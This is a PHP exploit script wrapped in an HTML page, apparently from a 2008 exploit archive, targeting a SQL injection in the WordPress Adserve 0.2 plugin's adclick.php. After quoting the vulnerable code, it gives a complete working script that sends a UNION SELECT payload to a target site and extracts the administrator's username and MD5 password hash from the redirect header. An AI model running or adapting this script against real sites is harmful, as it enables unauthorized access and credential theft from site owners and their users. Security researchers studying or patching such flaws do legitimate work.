<html><head><title>Wordpress Plugin Adserve 0.2 adclick.php SQL Injection Exploit</title></head><pre>&lt;?
# WordPress Adserve plugin v 0.2 Sql Injection Exploit 
#
# Plugin Homepage-http://www.irisco.it/?page_id=40
# 	
# Found by:enter_the_dragon
# 

# Vuln code
#
# -In adclick.php
#
# if (isset($_GET['id'])) {
#    Header(&quot;Location: &quot;.iri_AdServe_BannerClick($_GET['id'])
#	
# -In  iri_AdServe_BannerClick function
#   
# 	return $wpdb-&gt;get_var(&quot;SELECT url FROM $table_name WHERE id=$id;&quot;);  
#
#
# 

# Exploit
# 
# id variable isnt filtered so we can inject and check the output in the Location response-header 
# If exploit is succesfull Wordpress administrators login and md5 hashed password is retrieved
#
# 




echo &quot;\n&quot;;
echo &quot;-------WordPress Adserve plugin v 0.2 Sql Injection Exploit-------&quot;.&quot;\n&quot;;
echo &quot;-------------------coded by : enter_the_dragon--------------------&quot;.&quot;\n&quot;;
echo &quot;------------------------------------------------------------------&quot;.&quot;\n&quot;;
if ($argc!=3)
{
echo &quot; Usage:	$argv[0] target_host wp_path \n&quot;;
echo &quot; target_host:	Your target ex www.target.com \n&quot;;
echo &quot; wp_path:	WordPress path ex /blog/ or / if wordpress is installed in the web servers root folder&quot;;	     
echo &quot;\n&quot;;
exit;
}


$query=$argv[1];
$query.=$argv[2];
$query.=&quot;wp-content/plugins/wp-adserve/adclick.php?&quot;;
$query.=&quot;id=-1%20union%20select%20concat(0x7c,user_login,0x7c,user_pass,0x7c)%20from%20wp_users&quot;;

  
if(function_exists(curl_init))
{
  $ch = curl_init(&quot;http://$query&quot;);
  curl_setopt($ch, CURLOPT_HEADER,true);
  curl_setopt( $ch, CURLOPT_RETURNTRANSFER,true);
  curl_setopt($ch, CURLOPT_TIMEOUT,10);
  curl_setopt($ch, CURLOPT_USERAGENT, &quot;Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)&quot;);  
  $html=curl_exec($ch);
  $returncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
  curl_close($ch);

  if($returncode==302)
     {  
	$pattern=&quot;/\|(.*)?\|([a-z0-9]{32})\|/&quot;;
        if(preg_match($pattern,$html,$matches))
          {
           $adminusername=$matches[1];
           $adminpass=$matches[2];
	   echo &quot;Admin Login:$adminusername\n&quot; ;
     	   echo &quot;Admin Pass :$adminpass\n&quot;;	    
	  }
     }		    
	else 
     {
	exit (&quot;Exploit Failed :( \n&quot;);
     }	


}
else
exit(&quot;Error:Libcurl isnt installed \n&quot;);

?&gt;

# milw0rm.com [2008-01-30]</pre></html>